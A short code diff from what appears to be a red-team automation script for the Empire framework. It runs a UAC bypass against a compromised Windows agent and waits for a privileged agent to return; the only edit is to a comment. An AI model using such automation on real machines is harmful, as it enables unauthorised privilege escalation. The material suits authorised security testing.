@@ -24,7 +24,7 @@ try:
     timestamp = empire_get_timestamp.run(API, agent['name'])
     print(timestamp + ' starting UAC bypass') # or log this
     empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
-    # wait for non-privilege agent for 120 seconds
+    # wait for privileged agent for 120 seconds
     agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', True, 120)
     if agent is not None:
         print('yeay!!! we got an {0} admin user'.format(admin_type))    
